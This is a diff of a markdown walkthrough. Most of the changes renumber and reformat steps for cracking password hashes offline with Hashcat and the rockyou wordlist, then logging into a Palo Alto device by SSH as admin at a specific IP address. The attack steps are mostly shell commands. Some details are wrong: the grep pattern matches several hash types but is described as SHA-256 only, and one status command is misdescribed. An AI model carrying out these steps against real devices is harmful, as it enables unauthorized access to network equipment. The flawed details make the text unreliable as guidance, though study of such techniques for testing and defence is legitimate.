@@ -428,8 +428,9 @@ grep -E '^[^:]+:!?\$[156]\$' users.txt > valid_hashes.txt
 
 ```
 
-   This command filters the content of users.txt and extracts the lines that start with valid SHA-256 hashes ($5$), saving them to a new file called valid_hashes.txt.
-5. Now that you have the valid hashes in valid_hashes.txt, you can begin cracking the passwords offline using Hashcat. Run the following command to start the cracking process with the rockyou.txt wordlist:
+This command filters the content of users.txt and extracts the lines that start with valid SHA-256 hashes ($5$), saving them to a new file called `valid_hashes.txt`.
+
+4. Now that you have the valid hashes in `valid_hashes.txt`, you can begin cracking the passwords offline using Hashcat. Run the following command to start the cracking process with the rockyou.txt wordlist:
 
 ```bash
 hashcat -m 7400 -a 0 valid_hashes.txt /usr/share/wordlists/rockyou.txt
@@ -438,15 +439,15 @@ hashcat -m 7400 -a 0 valid_hashes.txt /usr/share/wordlists/rockyou.txt
 This will use Hashcat to attempt cracking the passwords. The -m 7400 option specifies the SHA-256 crypt format, and the -a 0 option sets the attack mode to dictionary-based.
    -While Hashcat is running, you can check the status of the cracking process by using the following command: `hashcat --status`
 
-6. Once Hashcat has completed the cracking process, you can view the cracked passwords by running:
+5. Once Hashcat has completed the cracking process, you can view the cracked passwords by running:
 
 ```bash
 hashcat --show valid_hashes.txt
 ```
 
-7.Once the hashes are cracked run a cat on the valid_hashes.txt file to see who the passwords belong to: `cat valid_hashes.txt`
+6. Once the hashes are cracked run a cat on the valid_hashes.txt file to see who the passwords belong to: `cat valid_hashes.txt`
 
-8. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH:
+7. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH:
 
 ```bash
 ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@1.33.170.38
